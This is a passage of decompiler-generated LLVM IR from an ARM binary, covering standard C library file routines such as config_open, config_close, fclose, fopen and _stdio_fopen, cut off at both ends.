  store i32 %v3_dfbc, i32* %r2.global-to-local, align 4
  %v2_dfc0 = icmp eq i8 %v2_dfbc, 0
  store i1 %v2_dfc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dfc0, label %dec_label_pc_dfd8, label %dec_label_pc_dfb8.dec_label_pc_dfc8_crit_edge

dec_label_pc_dfb8.dec_label_pc_dfc8_crit_edge:    ; preds = %dec_label_pc_dfb8
  %v0_dfc8.pre = load i32, i32* @r7, align 4
  %v1_dfc8 = inttoptr i32 %v0_dfc8.pre to i8*
  %v2_dfc8 = load i8, i8* %v1_dfc8, align 1
  %v3_dfc8 = zext i8 %v2_dfc8 to i32
  store i32 %v3_dfc8, i32* %r3.global-to-local, align 4
  %v9_dfcc = icmp eq i8 %v2_dfc8, %v2_dfbc
  store i1 %v9_dfcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dfcc, label %dec_label_pc_dfd8, label %bb74

bb74:                                             ; preds = %dec_label_pc_dfc8.preheader, %dec_label_pc_dfb8.dec_label_pc_dfc8_crit_edge
  %v2_df1488 = phi i32 [ %v1_dfb8, %dec_label_pc_dfb8.dec_label_pc_dfc8_crit_edge ], [ %v1_def8, %dec_label_pc_dfc8.preheader ]
  %v0_df1487 = phi i32 [ %v0_dfbc, %dec_label_pc_dfb8.dec_label_pc_dfc8_crit_edge ], [ %v0_dfbc13, %dec_label_pc_dfc8.preheader ]
  %v2_dfd0 = load i32, i32* @sb, align 4
  %v3_dfd0 = sub i32 %v2_df1488, %v2_dfd0
  %v5_dfd0 = xor i32 %v2_dfd0, %v2_df1488
  %v6_dfd0 = xor i32 %v3_dfd0, %v2_df1488
  %v7_dfd0 = and i32 %v6_dfd0, %v5_dfd0
  %v8_dfd0 = icmp slt i32 %v7_dfd0, 0
  %v9_dfd0 = icmp slt i32 %v3_dfd0, 0
  %v10_dfd0 = icmp eq i32 %v2_df1488, %v2_dfd0
  store i1 %v10_dfd0, i1* %cpsr_z.global-to-local, align 1
  %v2_dfd4 = xor i1 %v9_dfd0, %v8_dfd0
  br i1 %v2_dfd4, label %dec_label_pc_df04, label %dec_label_pc_dfd8

dec_label_pc_dfd8:                                ; preds = %dec_label_pc_dfc8.preheader, %bb74, %dec_label_pc_dfb8, %dec_label_pc_dfb8.dec_label_pc_dfc8_crit_edge, %dec_label_pc_dfbc.preheader
  %v0_dfdc = phi i32 [ %v1_def8, %dec_label_pc_dfbc.preheader ], [ %v1_def8, %dec_label_pc_dfc8.preheader ], [ %v2_df1488, %bb74 ], [ %v1_dfb8, %dec_label_pc_dfb8 ], [ %v1_dfb8, %dec_label_pc_dfb8.dec_label_pc_dfc8_crit_edge ]
  store i32 %v3_dcfc, i32* %r2.global-to-local, align 4
  %v9_dfdc = icmp eq i32 %v0_dfdc, %v3_dcfc
  store i1 %v9_dfdc, i1* %cpsr_z.global-to-local, align 1
  %v6_dfe0 = icmp slt i32 %v0_dfdc, %v3_dcfc
  br i1 %v6_dfe0, label %dec_label_pc_dfe4, label %dec_label_pc_dff0

dec_label_pc_dfe4:                                ; preds = %dec_label_pc_dfd8
  %v0_dfe4 = load i32, i32* @r8, align 4
  %v1_dfe4 = and i32 %v0_dfe4, 1048576
  %v2_dfe4 = icmp eq i32 %v1_dfe4, 0
  store i1 %v2_dfe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dfe4, label %dec_label_pc_dd3c.backedge, label %dec_label_pc_dfec

dec_label_pc_dfec:                                ; preds = %dec_label_pc_dfe4, %dec_label_pc_dea4, %.thread, %entry
  br label %dec_label_pc_dff0

dec_label_pc_dff0:                                ; preds = %dec_label_pc_dfd8, %dec_label_pc_ddc0, %dec_label_pc_dfec
  %v0_dff0 = phi i32 [ %v0_ddd0, %dec_label_pc_ddc0 ], [ 0, %dec_label_pc_dfec ], [ %v0_dfdc, %dec_label_pc_dfd8 ]
  store i32 %v0_dff0, i32* %r0.global-to-local, align 4
  store i32 %v3_dcd8, i32* @r4, align 4
  store i32 %v6_dcd8, i32* @r5, align 4
  store i32 %v9_dcd8, i32* @r6, align 4
  store i32 %v12_dcd8, i32* @r7, align 4
  store i32 %v15_dcd8, i32* @r8, align 4
  store i32 %v18_dcd8, i32* @sb, align 4
  store i32 %v21_dcd8, i32* @sl, align 4
  store i32 %v24_dcd8, i32* @fp, align 4
  ret i32 %v0_dff0

; uselistorder directives
  uselistorder i32 %v0_dff0, { 1, 0 }
  uselistorder i32 %v0_dfdc, { 0, 2, 1 }
  uselistorder i32 %v3_dfd0, { 1, 0 }
  uselistorder i32 %v2_dfd0, { 1, 0, 2 }
  uselistorder i32 %v2_df1488, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_dfcc, { 1, 0 }
  uselistorder i32 %v0_dfbc.pre, { 0, 2, 1 }
  uselistorder i32 %v5_df50, { 1, 0, 2, 3 }
  uselistorder i1 %v9_dfcc86, { 1, 0 }
  uselistorder i1 %v9_def4, { 1, 0 }
  uselistorder i32 %v3_decc, { 0, 2, 1, 3 }
  uselistorder i1 %v7_dea4, { 1, 0 }
  uselistorder i1 %v8_de9c, { 1, 0 }
  uselistorder i32 %v3_de6c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_de5c, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_de44, { 1, 0, 2 }
  uselistorder i32 %v1_de34, { 1, 0, 2 }
  uselistorder i32 %v0_de20, { 0, 2, 1, 3 }
  uselistorder i32 %v1_de18, { 1, 0 }
  uselistorder i32 %v1_de04, { 1, 0 }
  uselistorder i32 %v1_de00, { 1, 0 }
  uselistorder i32 %v2_dddc, { 1, 0 }
  uselistorder i32 %v1_ddc0, { 2, 0, 1 }
  uselistorder i32 %v0_dda8, { 1, 0 }
  uselistorder i32 %v1_dd98, { 0, 2, 1 }
  uselistorder i1 %v2_dec8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_dd24, { 2, 0, 1, 3 }
  uselistorder i32 %v1_dd18, { 2, 1, 0 }
  uselistorder i32 %v3_dd00, { 1, 0 }
  uselistorder i32 %v3_dcfc, { 2, 1, 0 }
  uselistorder i32 %v1_dcf4, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 25, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 16, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 33, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 %arg3, { 2, 3, 1, 5, 0, 4, 6 }
  uselistorder label %dec_label_pc_dff0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dfd8, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_dfb8, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_df6c, { 1, 0 }
  uselistorder label %dec_label_pc_dd3c.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_dee4, { 1, 0 }
  uselistorder label %dec_label_pc_dea4, { 1, 0 }
  uselistorder label %dec_label_pc_de98, { 0, 2, 1 }
  uselistorder label %dec_label_pc_de5c, { 1, 0 }
  uselistorder label %dec_label_pc_dd90, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_e004 = icmp eq i32* %arg1, null
  br i1 %v2_e004, label %dec_label_pc_e02c, label %dec_label_pc_e00c

dec_label_pc_e00c:                                ; preds = %entry
  %v2_e00c = load i32, i32* %arg1, align 4
  %v1_e010 = inttoptr i32 %v2_e00c to i16*
  %v2_e010 = call i32 @__GI_fclose(i16* %v1_e010)
  %v0_e014 = load i32, i32* @r4, align 4
  %v1_e014 = add i32 %v0_e014, 20
  %v2_e014 = inttoptr i32 %v1_e014 to i32*
  %v3_e014 = load i32, i32* %v2_e014, align 4
  %v2_e018 = icmp eq i32 %v3_e014, 0
  br i1 %v2_e018, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_e00c
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_e00c, %bb
  store i32 57380, i32* @lr, align 4
  %v1_e020 = xor i1 %v2_e018, true
  call void @__pseudo_cond_branch(i1 %v1_e020, i32 ptrtoint (i32* @global_var_bd70.236 to i32))
  %v0_e024 = load i32, i32* @r4, align 4
  store i32 %v0_e024, i32* @r0, align 4
  %v0_e028 = call i32 @free()
  br label %dec_label_pc_e02c

dec_label_pc_e02c:                                ; preds = %entry, %bb6
  %v1_e030 = phi i32 [ 0, %entry ], [ %v0_e028, %bb6 ]
  ret i32 %v1_e030

; uselistorder directives
  uselistorder label %dec_label_pc_e02c, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e040 = load i32, i32* @r4, align 4
  store i32 %v3_e040, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37396), i32* @r1, align 4
  %v0_e048 = load i32, i32* @r0, align 4
  %v2_e048 = load i32, i32* @r2, align 4
  %v4_e048 = call i32 @__GI_fopen(i32 %v0_e048, i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37396), i32 %v2_e048, i32 ptrtoint (i32* @global_var_1f010.69 to i32))
  store i32 %v4_e048, i32* %r0.global-to-local, align 4
  store i32 %v4_e048, i32* @r4, align 4
  %v2_e04c = icmp eq i32 %v4_e048, 0
  br i1 %v2_e04c, label %bb, label %dec_label_pc_e058

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_e058:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_e060 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_e060, i32* %r0.global-to-local, align 4
  %v2_e064 = icmp eq i32 %v2_e060, 0
  br i1 %v2_e064, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_e058
  %v1_e068 = load i32, i32* @r4, align 4
  %v3_e068 = inttoptr i32 %v2_e060 to i32*
  store i32 %v1_e068, i32* %v3_e068, align 4
  %v1_e070.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_e058, %bb4
  %v1_e070 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_e058 ], [ %v1_e070.pre, %bb4 ]
  %v2_e06c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e06c, i32* @r4, align 4
  ret i32 %v1_e070

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37396), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_e07c = load i32, i32* @r4, align 4
  store i32 %v3_e07c, i32* %stack_var_-36, align 4
  %v6_e07c = load i32, i32* @r5, align 4
  %v9_e07c = load i32, i32* @r6, align 4
  %v12_e07c = load i32, i32* @r7, align 4
  %v15_e07c = load i32, i32* @r8, align 4
  %v27_e07c = load i32, i32* @lr, align 4
  %v2_e080 = add i32 %tmp, 52
  %v3_e080 = inttoptr i32 %v2_e080 to i32*
  %v4_e080 = load i32, i32* %v3_e080, align 4
  %v1_e088 = sub i32 1, %v4_e080
  %v2_e088 = icmp ult i32 %v4_e080, 2
  br i1 %v2_e088, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_e088, %entry ]
  %v0_e090 = phi i32 [ 0, %bb ], [ %v1_e088, %entry ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_e090 = icmp eq i32 %v0_e090, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r6, align 4
  br i1 %v2_e090, label %dec_label_pc_e0dc, label %dec_label_pc_e0a4

dec_label_pc_e0a4:                                ; preds = %thread-pre-split
  %v4_e0bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_e0bc)
  %v0_e0d0 = load i32, i32* @r6, align 4
  %v2_e0d0 = add i32 %v0_e0d0, 16
  %v3_e0d0 = inttoptr i32 %v2_e0d0 to i32*
  %v4_e0d0 = load i32, i32* %v3_e0d0, align 4
  call void @__pseudo_branch(i32 %v4_e0d0)
  %v0_e0dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_e0dc

dec_label_pc_e0dc:                                ; preds = %thread-pre-split, %dec_label_pc_e0a4
  %v1_e0e4 = phi i32 [ %tmp, %thread-pre-split ], [ %v0_e0dc.pre, %dec_label_pc_e0a4 ]
  %v1_e0dc = inttoptr i32 %v1_e0e4 to i16*
  %v2_e0dc = load i16, i16* %v1_e0dc, align 2
  %v3_e0dc = zext i16 %v2_e0dc to i32
  %v1_e0e0 = and i32 %v3_e0dc, 64
  %v2_e0e0 = icmp eq i32 %v1_e0e0, 0
  br i1 %v2_e0e0, label %bb18, label %bb17

bb17:                                             ; preds = %dec_label_pc_e0dc
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_e0dc, %bb17
  %storemerge24 = phi i32 [ %v1_e0e4, %bb17 ], [ %v1_e0e0, %dec_label_pc_e0dc ]
  %v1_e0e8 = xor i1 %v2_e0e0, true
  call void @__pseudo_cond_branch(i1 %v1_e0e8, i32 ptrtoint (i32* @global_var_ea18.244 to i32))
  store i32 %storemerge24, i32* %sl.global-to-local, align 4
  %v0_e0f0 = load i32, i32* @r5, align 4
  %v1_e0f0 = add i32 %v0_e0f0, 4
  %v2_e0f0 = inttoptr i32 %v1_e0f0 to i32*
  %v3_e0f0 = load i32, i32* %v2_e0f0, align 4
  %v1_e0f4 = call i32 @__GI_close(i32 %v3_e0f0)
  %v0_e0fc = load i32, i32* @r6, align 4
  %v2_e108 = add i32 %v0_e0fc, 112
  %v3_e108 = inttoptr i32 %v2_e108 to i32*
  %v4_e108 = load i32, i32* %v3_e108, align 4
  store i32 %v4_e108, i32* @r7, align 4
  %v1_e110 = load i32, i32* @r5, align 4
  %v2_e110 = add i32 %v1_e110, 4
  %v3_e110 = inttoptr i32 %v2_e110 to i32*
  store i32 -1, i32* %v3_e110, align 4
  %v0_e118 = load i32, i32* @r6, align 4
  %v2_e118 = add i32 %v0_e118, 76
  %v3_e118 = inttoptr i32 %v2_e118 to i32*
  %v4_e118 = load i32, i32* %v3_e118, align 4
  %v1_e120 = icmp slt i32 %v1_e0f4, 0
  store i32 %v4_e118, i32* %stack_var_-80, align 4
  br i1 %v1_e120, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  call void @__pseudo_branch(i32 %v4_e118)
  %v0_e148 = load i32, i32* @r6, align 4
  %v2_e148 = add i32 %v0_e148, 16
  %v3_e148 = inttoptr i32 %v2_e148 to i32*
  %v4_e148 = load i32, i32* %v3_e148, align 4
  call void @__pseudo_branch(i32 %v4_e148)
  %v0_e158 = load i32, i32* @r6, align 4
  %v2_e158 = add i32 %v0_e158, 12
  %v3_e158 = inttoptr i32 %v2_e158 to i32*
  %v4_e158 = load i32, i32* %v3_e158, align 4
  %v1_e15c = inttoptr i32 %v4_e158 to i32*
  %v2_e15c = load i32, i32* %v1_e15c, align 4
  %v1_e164 = add i32 %v2_e15c, 1
  %v2_e168 = add i32 %v0_e158, 24
  %v3_e168 = inttoptr i32 %v2_e168 to i32*
  %v4_e168 = load i32, i32* %v3_e168, align 4
  store i32 %v4_e168, i32* @r4, align 4
  store i32 %v1_e164, i32* %v1_e15c, align 4
  call void @__pseudo_branch(i32 %v4_e168)
  %v0_e180 = load i32, i32* @r5, align 4
  %v1_e180 = inttoptr i32 %v0_e180 to i16*
  %v2_e180 = load i16, i16* %v1_e180, align 2
  %v1_e184 = and i16 %v2_e180, 24576
  %v1_e188 = or i16 %v1_e184, 48
  %v0_e18c = load i32, i32* %sb.global-to-local, align 4
  %v2_e18c = icmp eq i32 %v0_e18c, 0
  store i16 %v1_e188, i16* %v1_e180, align 2
  br i1 %v2_e18c, label %.thread, label %bb21

bb21:                                             ; preds = %bb20
  br label %.thread

.thread:                                          ; preds = %bb20, %bb21
  %v2_e1a0 = xor i1 %v2_e18c, true
  call void @__pseudo_cond_branch(i1 %v2_e1a0, i32 %v4_e168)
  %v0_e1a4 = load i32, i32* @r5, align 4
  %v1_e1a4 = inttoptr i32 %v0_e1a4 to i16*
  %v2_e1a4 = load i16, i16* %v1_e1a4, align 2
  %v1_e1a8 = and i16 %v2_e1a4, 16384
  %v2_e1a8 = icmp eq i16 %v1_e1a8, 0
  br i1 %v2_e1a8, label %bb23, label %bb22

bb22:                                             ; preds = %.thread
  br label %bb23

bb23:                                             ; preds = %.thread, %bb22
  %v1_e1b0 = xor i1 %v2_e1a8, true
  call void @__pseudo_cond_branch(i1 %v1_e1b0, i32 ptrtoint (i32* @global_var_bd70.236 to i32))
  %v2_e1bc = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_e1bc)
  call void @__pseudo_branch(i32 %v4_e148)
  %v0_e1dc = load i32, i32* @r6, align 4
  %v2_e1dc = add i32 %v0_e1dc, 52
  %v3_e1dc = inttoptr i32 %v2_e1dc to i32*
  %v4_e1dc = load i32, i32* %v3_e1dc, align 4
  %v1_e1e0 = inttoptr i32 %v4_e1dc to i32*
  %v2_e1e0 = load i32, i32* %v1_e1e0, align 4
  %v1_e1e4 = add i32 %v2_e1e0, 1
  store i32 %v1_e1e4, i32* %v1_e1e0, align 4
  call void @__pseudo_branch(i32 %v4_e168)
  %v0_e1fc = call i32 @_stdio_openlist_dec_use()
  %v0_e200 = load i32, i32* %sl.global-to-local, align 4
  %v2_e208 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_e208, i32* @r4, align 4
  store i32 %v6_e07c, i32* @r5, align 4
  store i32 %v9_e07c, i32* @r6, align 4
  store i32 %v12_e07c, i32* @r7, align 4
  store i32 %v15_e07c, i32* @r8, align 4
  store i32 %v27_e07c, i32* @lr, align 4
  ret i32 %v0_e200

; uselistorder directives
  uselistorder i1 %v2_e1a8, { 1, 0 }
  uselistorder i32 %v4_e168, { 0, 2, 1, 3 }
  uselistorder i32 %v1_e088, { 1, 0 }
  uselistorder i32 %v4_e080, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_e0dc, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_e214(i32 %arg1) local_unnamed_addr {
dec_label_pc_e214:
  %v0_e214 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e214, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_e214
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_e214, %bb
  %v10_e22c = phi i32 [ %arg1, %dec_label_pc_e214 ], [ 0, %bb ]
  ret i32 %v10_e22c

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_e240 = call i32 @_stdio_fopen()
  ret i32 %v0_e240
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_e250 = load i32, i32* @r4, align 4
  store i32 %v3_e250, i32* %stack_var_-36, align 4
  %v6_e250 = load i32, i32* @r5, align 4
  %v9_e250 = load i32, i32* @r6, align 4
  %v18_e250 = load i32, i32* @sb, align 4
  %v24_e250 = load i32, i32* @fp, align 4
  %v0_e254 = load i32, i32* @r1, align 4
  %v1_e254 = inttoptr i32 %v0_e254 to i8*
  %v2_e254 = load i8, i8* %v1_e254, align 1
  %v3_e254 = zext i8 %v2_e254 to i32
  store i32 %v3_e254, i32* @ip, align 4
  %v7_e25c = icmp eq i8 %v2_e254, 114
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @fp, align 4
  %v2_e264 = ptrtoint i32* %stack_var_-72 to i32
  %v0_e268 = load i32, i32* @r0, align 4
  store i32 %v0_e268, i32* @r6, align 4
  %v0_e26c = load i32, i32* @r2, align 4
  store i32 %v0_e26c, i32* @sb, align 4
  %v0_e270 = load i32, i32* @r3, align 4
  store i32 %v0_e270, i32* @r5, align 4
  br i1 %v7_e25c, label %dec_label_pc_e2bc, label %dec_label_pc_e278

dec_label_pc_e278:                                ; preds = %entry
  %v7_e278 = icmp eq i8 %v2_e254, 119
  br i1 %v7_e278, label %bb, label %dec_label_pc_e284

bb:                                               ; preds = %dec_label_pc_e278
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_e2c0

dec_label_pc_e284:                                ; preds = %dec_label_pc_e278
  %v7_e284 = icmp eq i8 %v2_e254, 97
  br i1 %v7_e284, label %bb34, label %dec_label_pc_e290

bb34:                                             ; preds = %dec_label_pc_e284
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_e2c0

dec_label_pc_e290:                                ; preds = %dec_label_pc_e284, %dec_label_pc_e344, %dec_label_pc_e318
  %v0_e290 = call i32 @__GI___errno_location()
  store i32 %v0_e290, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_e298 = load i32, i32* @sb, align 4
  %v2_e298 = icmp eq i32 %v0_e298, 0
  %v2_e29c = inttoptr i32 %v0_e290 to i32*
  store i32 22, i32* %v2_e29c, align 4
  br i1 %v2_e298, label %dec_label_pc_e510, label %dec_label_pc_e2a4

dec_label_pc_e2a4:                                ; preds = %dec_label_pc_e368._crit_edge, %dec_label_pc_e290
  %v0_e2a4 = load i32, i32* @sb, align 4
  %v1_e2a4 = inttoptr i32 %v0_e2a4 to i16*
  %v2_e2a4 = load i16, i16* %v1_e2a4, align 2
  %v3_e2a4 = zext i16 %v2_e2a4 to i32
  store i32 %v3_e2a4, i32* %r3.global-to-local, align 4
  %v1_e2a8 = and i32 %v3_e2a4, 8192
  %v2_e2a8 = icmp eq i32 %v1_e2a8, 0
  br i1 %v2_e2a8, label %dec_label_pc_e510, label %dec_label_pc_e2b0

dec_label_pc_e2b0:                                ; preds = %dec_label_pc_e2a4
  store i32 %v0_e2a4, i32* @r0, align 4
  %v0_e2b4 = call i32 @free()
  store i32 %v0_e2b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e510

dec_label_pc_e2bc:                                ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_e2c0

dec_label_pc_e2c0:                                ; preds = %bb, %bb34, %dec_label_pc_e2bc
  %v1_e2d8 = phi i32 [ 1089, %bb34 ], [ 577, %bb ], [ 1, %dec_label_pc_e2bc ]
  %v1_e2c0 = add i32 %v0_e254, 1
  %v2_e2c0 = inttoptr i32 %v1_e2c0 to i8*
  %v3_e2c0 = load i8, i8* %v2_e2c0, align 1
  %v7_e2c4 = icmp eq i8 %v3_e2c0, 98
  %v1_e2c0.v0_e254 = select i1 %v7_e2c4, i32 %v1_e2c0, i32 %v0_e254
  store i32 %v1_e2c0.v0_e254, i32* %r3.global-to-local, align 4
  %v1_e2d0 = add i32 %v1_e2c0.v0_e254, 1
  %v2_e2d0 = inttoptr i32 %v1_e2d0 to i8*
  %v3_e2d0 = load i8, i8* %v2_e2d0, align 1
  %v4_e2d0 = zext i8 %v3_e2d0 to i32
  store i32 %v4_e2d0, i32* @r3, align 4
  %v7_e2d4 = icmp eq i8 %v3_e2d0, 43
  br i1 %v7_e2d4, label %bb37, label %.thread5

bb37:                                             ; preds = %dec_label_pc_e2c0
  store i32 %v1_e2d8, i32* @r3, align 4
  %v2_e2dc = add nuw nsw i32 %v1_e2d8, 1
  store i32 %v2_e2dc, i32* @r4, align 4
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_e2c0, %bb37
  %v2_e2e0 = icmp eq i32 %v0_e26c, 0
  br i1 %v2_e2e0, label %dec_label_pc_e2e8, label %dec_label_pc_e310

dec_label_pc_e2e8:                                ; preds = %.thread5
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_e2ec = call i32 @malloc(i32 80)
  store i32 %v1_e2ec, i32* %r0.global-to-local, align 4
  store i32 %v1_e2ec, i32* @sb, align 4
  %v3_e2f0 = icmp eq i32 %v1_e2ec, 0
  br i1 %v3_e2f0, label %dec_label_pc_e514, label %dec_label_pc_e2f8

dec_label_pc_e2f8:                                ; preds = %dec_label_pc_e2e8
  %v2_e2fc = add i32 %v1_e2ec, 8
  %v3_e2fc = inttoptr i32 %v2_e2fc to i32*
  store i32 0, i32* %v3_e2fc, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_e304 = load i32, i32* @sb, align 4
  %v3_e304 = inttoptr i32 %v2_e304 to i16*
  store i16 8192, i16* %v3_e304, align 2
  %v0_e308 = load i32, i32* @sb, align 4
  %v1_e308 = add i32 %v0_e308, 56
  store i32 %v1_e308, i32* @r0, align 4
  %v1_e30c = call i32 @__stdio_init_mutex(i32 %v1_e308)
  store i32 %v1_e30c, i32* %r0.global-to-local, align 4
  %v0_e310.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_e310

dec_label_pc_e310:                                ; preds = %.thread5, %dec_label_pc_e2f8
  %v0_e368 = phi i32 [ %v0_e270, %.thread5 ], [ %v0_e310.pre, %dec_label_pc_e2f8 ]
  %v1_e310 = icmp slt i32 %v0_e368, 0
  br i1 %v1_e310, label %dec_label_pc_e368, label %dec_label_pc_e318

dec_label_pc_e318:                                ; preds = %dec_label_pc_e310
  %v0_e31c = load i32, i32* @r4, align 4
  %v2_e31c = and i32 %v0_e31c, ptrtoint (i32* @global_var_20003.253 to i32)
  %v1_e320 = or i32 %v2_e31c, 1
  store i32 %v1_e320, i32* @r2, align 4
  %v0_e324 = load i32, i32* @r6, align 4
  %v1_e324 = add i32 %v0_e324, 1
  %v2_e328 = and i32 %v1_e324, %v1_e320
  store i32 %v2_e328, i32* %r3.global-to-local, align 4
  %v9_e32c = icmp eq i32 %v2_e328, %v1_e320
  %v1_e330 = load i32, i32* @sb, align 4
  %v2_e330 = add i32 %v1_e330, 4
  %v3_e330 = inttoptr i32 %v2_e330 to i32*
  store i32 %v0_e368, i32* %v3_e330, align 4
  br i1 %v9_e32c, label %dec_label_pc_e338, label %dec_label_pc_e290

dec_label_pc_e338:                                ; preds = %dec_label_pc_e318
  %v0_e338 = load i32, i32* @r4, align 4
  %v1_e338 = load i32, i32* @r6, align 4
  %v2_e338 = sub i32 -1, %v1_e338
  %v3_e338 = and i32 %v0_e338, %v2_e338
  store i32 %v3_e338, i32* @r3, align 4
  %v1_e33c = and i32 %v3_e338, 1024
  %v2_e33c = icmp eq i32 %v1_e33c, 0
  br i1 %v2_e33c, label %dec_label_pc_e35c, label %dec_label_pc_e344

dec_label_pc_e344:                                ; preds = %dec_label_pc_e338
  %v0_e344 = load i32, i32* @r5, align 4
  store i32 %v0_e344, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_e350 = call i32 @__libc_fcntl(i32 %v0_e344, i32 4)
  store i32 %v2_e350, i32* %r0.global-to-local, align 4
  %v2_e354 = icmp eq i32 %v2_e350, 0
  br i1 %v2_e354, label %dec_label_pc_e344.dec_label_pc_e35c_crit_edge, label %dec_label_pc_e290

dec_label_pc_e344.dec_label_pc_e35c_crit_edge:    ; preds = %dec_label_pc_e344
  %v0_e35c.pre = load i32, i32* @r6, align 4
  %v0_e360.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e35c

dec_label_pc_e35c:                                ; preds = %dec_label_pc_e344.dec_label_pc_e35c_crit_edge, %dec_label_pc_e338
